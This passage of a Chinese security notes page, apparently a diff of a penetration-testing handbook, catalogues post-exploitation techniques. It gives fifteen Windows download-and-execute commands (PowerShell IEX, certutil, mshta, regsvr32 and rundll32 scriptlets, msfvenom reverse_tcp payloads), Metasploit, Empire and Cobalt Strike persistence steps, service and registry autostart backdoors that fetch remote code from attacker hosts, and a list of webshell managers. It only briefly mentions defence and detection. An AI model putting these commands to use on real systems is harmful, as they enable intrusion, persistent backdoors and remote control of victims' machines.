+<p><a href="https://www.cnblogs.com/zaqzzz/p/12099463.html">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p>
+<p><a href="https://www.secpulse.com/archives/100484.html">https://www.secpulse.com/archives/100484.html</a></p>
+<p>linux各种一句话反弹shell总结</p>
+<p><a href="https://yq.aliyun.com/articles/519250?type=2">https://yq.aliyun.com/articles/519250?type=2</a></p>
+<p>Linux OpenSSH后门的添加与防范</p>
+<p><a href="https://yq.aliyun.com/articles/69350">https://yq.aliyun.com/articles/69350</a></p>
+<p>Linux后门整理合集</p>
+<p><a href="https://www.cnblogs.com/maplered/p/9224617.html">https://www.cnblogs.com/maplered/p/9224617.html</a></p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p>
+<p>linux 后门</p>
+<p><a href="https://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p>
+<h2 id="5windows">第5篇：Windows命令行文件下载方式汇总<a class="headerlink" href="#5windows" title="Permanent link">&para;</a></h2>
+<p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p>
+<p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式**</strong>。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p>
+<p><strong>在这里，****本文收集了15种常见的文件下载执行的方式，并结合具体案例</strong>，让我们一起来看看是怎么实现的吧。</p>
+<hr />
+<ul>
+<li>PowerShell</li>
+<li>Bitsadmin</li>
+<li>certutil</li>
+<li>wget</li>
+<li>ipc$文件共享</li>
+<li>FTP</li>
+<li>TFTP</li>
+<li>WinScp</li>
+<li>msiexec</li>
+<li>IEExec</li>
+<li>mshta</li>
+<li>rundll32</li>
+<li>regsvr32</li>
+<li>MSXSL.EXE</li>
+<li>pubprn.vbs</li>
+</ul>
+<hr />
+<p><strong>1、PowerShell</strong></p>
+<p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。</p>
+<p>远程下载文件保存在本地：</p>
+<div class="highlight"><pre><span></span><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.28.128/imag/evil.txt&#39;,&#39;evil.exe&#39;)
+</code></pre></div>
+<p>远程执行命令：</p>
+<div class="highlight"><pre><span></span><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.128/imag/evil.txt&#39;))&quot;
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-1.png" /></p>
+<p><strong>2、Bitsadmin</strong></p>
+<p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<div class="highlight"><pre><span></span><code>bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
+</code></pre></div>
+<p>输入以上命令，成功下载文件。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-2.png" /></p>
+<p><strong>3、certutil</strong></p>
+<p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<p>注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"</p>
+<div class="highlight"><pre><span></span><code>#下载文件
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
+#删除缓存
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-3.png" /></p>
+<p><strong>4、wget</strong></p>
+<p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p>
+<p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p>
+<div class="highlight"><pre><span></span><code>wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-4.png" /></p>
+<p><strong>5、ipc$文件共享</strong></p>
+<p>IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<div class="highlight"><pre><span></span><code>#建立远程IPC连接
+net use \\192.168.28.128\ipc$ /user:administrator &quot;abc123!&quot;
+#复制远程文件到本地主机
+copy \\192.168.28.128\c$\2.txt D:\test
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-5.png" /></p>
+<p><strong>6、FTP</strong></p>
+<p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+<div class="highlight"><pre><span></span><code>ftp 127.0.0.1
+username
+password
+get file
+exit
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-6.png" /></p>
+<p><strong>7、TFTP</strong></p>
+<p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p>
+<p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p>
+<div class="highlight"><pre><span></span><code>tftp -i 你的IP get 要下载文件 存放位置
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-7.png" /></p>
+<p><strong>8、WinScp</strong></p>
+<p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p>
+<div class="highlight"><pre><span></span><code>#上传
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt  /tmp/&quot; &quot;exit&quot; /log=log_file.txt 
+
+#下载
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.tx
+</code></pre></div>
+<p>使用winscp.exe 作为命令行参数执行远程上传/下载操作。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-8.png" /></p>
+<p><strong>9、msiexec</strong></p>
+<p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p>
+<div class="highlight"><pre><span></span><code>#生成msi包
+msfvenom -p windows/exec CMD=&#39;net user test abc123! /add&#39; -f msi &gt; evil.msi
+#远程执行
+msiexec /q /i http://192.168.28.128/evil.msi
+</code></pre></div>
+<p>成功添加了一个test用户：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-9.png" /></p>
+<p><strong>10、IEExec</strong></p>
+<p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p>
+<p>生成Payload：</p>
+<div class="highlight"><pre><span></span><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
+</code></pre></div>
+<p>使用管理员身份打开cmd，分别运行下面两条命令。</p>
+<div class="highlight"><pre><span></span><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-10.png" /></p>
+<p><strong>11、mshta</strong></p>
+<p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p>
+<div class="highlight"><pre><span></span><code>mshta http://192.168.28.128/run.hta
+</code></pre></div>
+<p>run.hta内容如下：</p>
+<div class="highlight"><pre><span></span><code>&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;cmd.exe /c net user test password /add&quot; // 这里填写命令
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-11.png" /></p>
+<p><strong>12、rundll32</strong></p>
+<p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p>
+<p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p>
+<p>步骤一：开始运行JSRat，监听本地8888端口。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-12-1.png" /></p>
+<p>步骤二：通过url访问，可以查看恶意代码。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-12-2.png" /></p>
+<p>复制代码如下：</p>
+<div class="highlight"><pre><span></span><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}
+</code></pre></div>
+<p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-12-3.png" /></p>
+<p><strong>13、regsvr32</strong></p>
+<p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p>
+<p>在目标机上执行：</p>
+<div class="highlight"><pre><span></span><code>regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
+</code></pre></div>
+<p>可以通过自己构造.sct文件，去下载执行我们的程序</p>
+<div class="highlight"><pre><span></span><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            ps  = &quot;cmd.exe /c calc.exe&quot;;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div>
+<p>执行命令，成功弹计算器：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-13.png" /></p>
+<p><strong>14、MSXSL.EXE</strong></p>
+<p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p>
+<p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p>
+<p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p>
+<div class="highlight"><pre><span></span><code>msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
+</code></pre></div>
+<p>demo.xml</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;
+&lt;customers&gt;
+&lt;customer&gt;
+&lt;name&gt;Microsoft&lt;/name&gt;
+&lt;/customer&gt;
+&lt;/customers&gt;
+</code></pre></div>
+<p>exec.xsl</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
+xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
+
+&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;
+   function xml(nodelist) {
+var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);
+   return nodelist.nextNode().xml;
+
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-14.png" /></p>
+<p><strong>15、pubprn.vbs</strong></p>
+<p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p>
+<div class="highlight"><pre><span></span><code>&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+</code></pre></div>
+<p>test.sct</p>
+<div class="highlight"><pre><span></span><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    description=&quot;Bandit&quot;
+    progid=&quot;Bandit&quot;
+    version=&quot;1.00&quot;
+    classid=&quot;{AAAA1111-0000-0000-0000-0000FEEDACDC}&quot;
+    remotable=&quot;true&quot;
+    &gt;
+&lt;/registration&gt;
+&lt;script language=&quot;JScript&quot;&gt;
+&lt;![CDATA[
+        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/20200413-15.png" /></p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/1654/">https://xz.aliyun.com/t/1654/</a></p>
+<p><a href="https://evi1cg.me/archives/remote_exec.html">https://evi1cg.me/archives/remote_exec.html</a></p>
+<p>收集整理的15种文件下载的方式</p>
+<p><a href="https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A">https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A</a></p>
+<p>Windows执行命令与下载文件总结</p>
+<p><a href="https://www.cnblogs.com/17bdw/p/8550189.html">https://www.cnblogs.com/17bdw/p/8550189.html</a></p>
+<p>在windows上执行恶意代码 by rundll32 &amp; regsvr32</p>
+<p><a href="https://www.jianshu.com/p/e8f65deac245">https://www.jianshu.com/p/e8f65deac245</a></p>
+<p>IEexec.exe执行payload</p>
+<p><a href="https://www.codercto.com/a/104908.html">https://www.codercto.com/a/104908.html</a></p>
+<p>rundll32.exe 多种方法绕过白名单</p>
+<p><a href="https://www.cnblogs.com/backlion/p/10488747.html">https://www.cnblogs.com/backlion/p/10488747.html</a></p>
+<h2 id="6">第6篇：三大渗透测试框架权限维持技术<a class="headerlink" href="#6" title="Permanent link">&para;</a></h2>
+<h3 id="0x00_2">0x00 前言<a class="headerlink" href="#0x00_2" title="Permanent link">&para;</a></h3>
+<p>在渗透测试中，有三个非常经典的渗透测试框架----Metasploit、Empire、Cobalt Strike。</p>
+<p>那么，通过漏洞获取到目标主机权限后，如何利用框架获得持久性权限呢？</p>
+<h3 id="0x01-msf">0x01 MSF权限维持<a class="headerlink" href="#0x01-msf" title="Permanent link">&para;</a></h3>
+<p>使用MSF维持权限的前提是先获得一个*meterpreter* shell，通过*meterpreter* shell获取持久性shell的方法有两种：</p>
+<p><strong>Persistence模块</strong></p>
+<p>通过启动项启动(persistence)的方式，在目标机器上以反弹回连。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-1.png" /></p>
+<div class="highlight"><pre><span></span><code>-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；
+-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。
+-S：作为服务自动启动代理程序（具有SYSTEM权限）
+</code></pre></div>
+<p>生成的相关文件位置 ：</p>
+<div class="highlight"><pre><span></span><code># 后门文件位置：
+C:\Windows\Temp
+C:\Users\Administrator\AppData\Local\Temp
+# 注册表位置：
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run\
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-2.png" /></p>
+<p><strong>Metsvc 模块</strong></p>
+<p>通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-3.png" /></p>
+<p>后门排查：目标主机上开启了一个Meterpreter服务。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-4.png" /></p>
+<h3 id="0x02-empire">0x02 Empire 权限维持<a class="headerlink" href="#0x02-empire" title="Permanent link">&para;</a></h3>
+<p>Empire的persistence模块提供了18种权限维持的方法，大致可以分为四类，即</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-17.png" /></p>
+<table>
+<thead>
+<tr>
+<th align="left">elevated（管理权限）</th>
+<th align="left">misc（杂项）</th>
+<th align="left">powerbreach</th>
+<th align="left">userland（用户权限）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">registry*</td>
+<td align="left">add_netuser</td>
+<td align="left">deaduser</td>
+<td align="left">backdoor_lnk</td>
+</tr>
+<tr>
+<td align="left">schtasks*</td>
+<td align="left">add_sid_history*</td>
+<td align="left">eventlog*</td>
+<td align="left">registry</td>
+</tr>
+<tr>
+<td align="left">wmi*</td>
+<td align="left">debugger*</td>
+<td align="left">resolver</td>
+<td align="left">schtasks</td>
+</tr>
+<tr>
+<td align="left">wmi_updater*</td>
+<td align="left">disable_machine_acct_change*</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">get_ssps</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">install_ssp*</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">memssp*</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">skeleton_key*</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody>
+</table>
+<p><strong>注册表</strong></p>
+<div class="highlight"><pre><span></span><code>(Empire: agents) &gt; agents
+(Empire: agents) &gt; interact URL3FZBV
+(Empire: URL3FZBV) &gt; usemodule persistence/elevated/registry*
+(Empire: powershell/persistence/elevated/registry) &gt; set Listener test
+(Empire: powershell/persistence/elevated/registry) &gt; execute
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-5.png" /></p>
+<p>因为是开机启动，所以会弹个黑框，之后还会弹出注册表添加的powershell启动项的框，在注册表位置如下：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-6.png" /></p>
+<p><strong>计划任务</strong></p>
+<div class="highlight"><pre><span></span><code>(Empire: agents) &gt; interact 9NZ2RWBC
+(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/schtasks*
+(Empire: powershell/persistence/elevated/schtasks) &gt; set Listener test
+(Empire: powershell/persistence/elevated/schtasks) &gt; set DailyTime 22:50
+(Empire: powershell/persistence/elevated/schtasks) &gt; execute
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-7.png" /></p>
+<p>在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-8.png" /></p>
+<p><strong>wmi</strong></p>
+<div class="highlight"><pre><span></span><code>(Empire: agents) &gt; interact 9NZ2RWBC
+(Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/wmi
+(Empire: powershell/persistence/elevated/wmi) &gt; set Listener test
+(Empire: powershell/persistence/elevated/wmi) &gt; run
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-9.png" /></p>
+<p>如何清除后门，最简单的方法就是使用Autoruns，选择WMI选项卡，右键就可以删除恶意后门。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-10.png" /></p>
+<h3 id="0x03-cobalt-strike">0x03 Cobalt Strike权限维持<a class="headerlink" href="#0x03-cobalt-strike" title="Permanent link">&para;</a></h3>
+<p>通过Cobalt Strike拿到一个shell，留后门的方法有很多，下面介绍两种比较常见的无文件、自启动后门。</p>
+<p>从Cobalt Strike菜单栏，Attacks--Web Drive-by--Scaripted Web Delivery，生成powershell后门。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-11.png" /></p>
+<p>根据需要可以自己选择，填写所需参数默认端口是80（需要注意的就是不要使用重复端口），Type选择powershell。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-12.png" /></p>
+<p>点击Launch后，返回powershell远程下载执行命令。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-13.png" /></p>
+<p><strong>服务自启动后门</strong></p>
+<div class="highlight"><pre><span></span><code>sc create &quot;Name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8080/a&#39;))\&quot;&quot;
+sc description  Name &quot;Just For Test&quot;   //设置服务的描述字符串
+sc config Name start= auto             //设置这个服务为自动启动 
+net start Name                         //启动服务
+</code></pre></div>
+<p>重启服务器后，成功返回一个shell。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-14.png" /></p>
+<p><strong>注册表自启动</strong></p>
+<p>在windows启动项注册表里面添加一个木马程序路径，如：</p>
+<div class="highlight"><pre><span></span><code>beacon&gt;getsystem
+beacon&gt;shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8080/a&#39;))\&quot;&quot; /f
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-15.png" /></p>
+<p>账号注销后，重新登录，界面上会出现powershell快速闪过消失，成功返回shell。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-3-16.png" /></p>
+<p>注册表还有哪些键值可以设置为自启动：</p>
+<div class="highlight"><pre><span></span><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+</code></pre></div>
+<hr />
+<h3 id="0x04_2">0x04 结束语<a class="headerlink" href="#0x04_2" title="Permanent link">&para;</a></h3>
+<p>本文简单介绍了通过三大渗透框架进行权限维持的几种方法，了解攻击者常用的渗透框架及后门技术，有助于更好地去发现并解决服务器安全问题。</p>
+<h2 id="7webshell">第7篇：常见WebShell管理工具<a class="headerlink" href="#7webshell" title="Permanent link">&para;</a></h2>
+<p>攻击者在入侵网站时，通常要通过各种方式写入Webshell，从而获得服务器的控制权限，比如执行系统命令、读取配置文件、窃取用户数据，篡改网站页面等操作。</p>
+<p>本文介绍十款常用的Webshell管理工具，以供你选择，你会选择哪一个？</p>
+<hr />
+<p><strong>1、中国菜刀(Chopper)</strong></p>
+<p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-1.png" /></p>
+<p><strong>2、蚁剑(AntSword)</strong></p>
+<p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。</p>
+<p>github项目地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-2.png" /></p>
+<p><strong>3、C刀(Cknife)</strong></p>
+<p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。</p>
+<p>github项目地址：<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-3.png" /></p>
+<p><strong>4、冰蝎(Behinder)</strong></p>
+<p>冰蝎”是一款动态二进制加密网站管理客户端。</p>
+<p>github地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-4.png" /></p>
+<p><strong>5、Xise</strong></p>
+<p>XISE WebShell管理工具。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-5.png" /></p>
+<p><strong>6、Altman</strong></p>
+<p>Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。</p>
+<p>github项目地址：<a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-6.png" /></p>
+<p><strong>7、Weevely</strong></p>
+<p>Weevely是一种Python编写的webshell管理工具，跨平台，只支持PHP。</p>
+<p>github项目地址：<a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
+<p>用法示例：</p>
+<div class="highlight"><pre><span></span><code>weevely generate &lt;password&gt; &lt;path&gt;
+weevely &lt;URL&gt; &lt;password&gt; [cmd]
+</code></pre></div>
+<p>同时，在Kali 2.0 版本下，集成了三款Web后门工具：WebaCoo、weevely、PHP Meterpreter。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-7.png" /></p>
+<p><strong>8、QuasiBot</strong></p>
+<p>QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。</p>
+<p>github项目地址：<a href="https://github.com/Smaash/quasibot">https://github.com/Smaash/quasibot</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-8.png" /></p>
+<p><strong>9、Webshell-Sniper</strong></p>
+<p>这是一款基于终端的webshell管理工具，仅支持在类Unix系统上运行。</p>
+<p>github项目地址：<a href="https://github.com/WangYihang/Webshell-Sniper">https://github.com/WangYihang/Webshell-Sniper</a></p>
+<p>用法示例：</p>
+<div class="highlight"><pre><span></span><code>Usage : 
+        python webshell-sniper.py [URL] [METHOD] [AUTH]
+Example : 
+        python webshell-sniper.py http://127.0.0.1/c.php POST c
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-9.png" /></p>
+<p><strong>10、WebshellManager</strong></p>
+<p>一款用PHP+Mysql写的一句话WEB端管理工具，目前仅支持对PHP的一句话进行操作。</p>
+<p>github项目地址：<a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-6-10.png" /></p>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-02-05 21:07:01</span>
+      
+    
+  </small>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
